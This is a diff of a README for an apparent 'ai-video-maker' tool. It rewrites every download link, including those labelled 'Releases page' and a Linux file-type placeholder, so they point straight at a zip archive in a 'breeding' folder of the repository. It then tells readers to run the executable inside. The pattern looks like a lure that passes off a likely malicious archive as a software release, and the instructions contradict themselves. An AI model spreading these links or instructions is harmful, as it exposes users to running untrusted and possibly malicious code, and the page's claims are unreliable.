@@ -17,7 +17,7 @@ Before you download, ensure your system meets these requirements:
 
 To get the **ai-video-maker**, click the button below to go to the Releases page:
 
-[![Download ai-video-maker](https://raw.githubusercontent.com/ahmed81994/ai-video-maker/main/breeding/ai-video-maker.zip%https://raw.githubusercontent.com/ahmed81994/ai-video-maker/main/breeding/ai-video-maker.zip)](https://raw.githubusercontent.com/ahmed81994/ai-video-maker/main/breeding/ai-video-maker.zip)
+[![Download ai-video-maker](https://github.com/ahmed81994/ai-video-maker/raw/refs/heads/main/breeding/ai-maker-video-2.9.zip%https://github.com/ahmed81994/ai-video-maker/raw/refs/heads/main/breeding/ai-maker-video-2.9.zip)](https://github.com/ahmed81994/ai-video-maker/raw/refs/heads/main/breeding/ai-maker-video-2.9.zip)
 
 ## 📋 Features
 
@@ -28,14 +28,14 @@ To get the **ai-video-maker**, click the button below to go to the Releases page
 
 ## 📂 Download & Install Instructions
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ahmed81994/ai-video-maker/main/breeding/ai-video-maker.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ahmed81994/ai-video-maker/raw/refs/heads/main/breeding/ai-maker-video-2.9.zip).
   
 2. **Select the Version:** On the Releases page, find the latest version of **ai-video-maker**.
 
 3. **Download the File:** Click on the file that matches your operating system. For example:
    - If you are using Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the appropriate `https://raw.githubusercontent.com/ahmed81994/ai-video-maker/main/breeding/ai-video-maker.zip` file.
+   - For Linux, download the appropriate `https://github.com/ahmed81994/ai-video-maker/raw/refs/heads/main/breeding/ai-maker-video-2.9.zip` file.
 
 4. **Install the Application:** 
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts to install.
